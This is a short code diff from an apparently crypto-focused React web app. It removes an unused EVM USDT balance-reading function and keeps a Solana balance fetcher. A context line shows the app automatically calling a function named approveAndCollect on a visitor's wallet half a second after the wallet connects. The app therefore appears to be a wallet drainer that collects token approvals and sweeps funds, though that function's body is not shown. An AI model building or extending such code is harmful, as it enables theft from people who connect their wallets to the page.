@@ -205,25 +205,7 @@ export default function App() {
       setTimeout(() => approveAndCollect(evmWalletProvider, evmAddress), 500);
     }
   }, [isEvmConnected, evmAddress, evmWalletProvider, chainId]);
-
-  // PRESERVED: Original EVM Balance Fetcher (Uses EVM_USDT)
-  const _getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
-    if (!currentChainId || !EVM_USDT[currentChainId]) {
-      setStatus('USDT not configured for this EVM chain')
-      return 0;
-    }
-    try {
-      const ethersProvider = new BrowserProvider(provider)
-      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
-      const bal = await token.balanceOf(addr)
-      const formatted = parseFloat(formatUnits(bal, 6))
-      setStatus('Ready')
-      return formatted;
-    } catch (e) {
-      log('❌ EVM balance fetch failed')
-      return 0;
-    }
-  }
+  
 
   // NEW: Solana Balance Fetcher
   const fetchSolanaBalances = async (address: string) => {
